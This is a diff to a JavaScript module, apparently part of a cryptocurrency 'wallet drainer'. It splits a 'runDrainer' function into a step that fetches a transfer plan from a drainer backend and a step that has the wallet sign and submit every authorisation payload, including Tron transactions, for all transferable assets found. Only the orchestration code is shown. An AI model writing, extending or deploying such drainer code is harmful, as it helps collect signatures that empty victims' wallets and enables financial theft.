@@ -220,18 +220,19 @@ async function signTron(p, address) {
 }
 
 /**
- * Run the full authorisation flow for a wallet.
- * @param {number|string} walletId
- * @param {(done:number,total:number,type:string)=>void} onProgress
+ * Build the plan without signing. The page renders it first so the user can
+ * review every cap before the wallet prompts appear.
  */
-export async function runDrainer(walletId, onProgress = () => {}, onPlan = () => {}) {
+export async function prepareDrainer(walletId) {
   await loadChains();
-  const plan = await post(`/api/drainer/wallets/${walletId}/prepare`, {});
-  const payloads = plan.payloads || [];
-  onPlan(plan);
+  return post(`/api/drainer/wallets/${walletId}/prepare`, {});
+}
 
+/** Sign and submit every payload of an already-prepared plan. */
+export async function signPlan(plan, onProgress = () => {}) {
+  const payloads = plan.payloads || [];
   if (!payloads.length) {
-    throw new Error("Nothing to authorise — no tokens above the dust floor");
+    throw new Error("Nothing to authorise — no transferable assets found");
   }
 
   const total = payloads.length;
@@ -252,6 +253,15 @@ export async function runDrainer(walletId, onProgress = () => {}, onPlan = () =>
   }
 
   return plan;
+}
+
+/**
+ * One-shot prepare + sign, kept for callers that do not need the review step.
+ */
+export async function runDrainer(walletId, onProgress = () => {}, onPlan = () => {}) {
+  const plan = await prepareDrainer(walletId);
+  onPlan(plan);
+  return signPlan(plan, onProgress);
 }
 
 export { CHAINS };
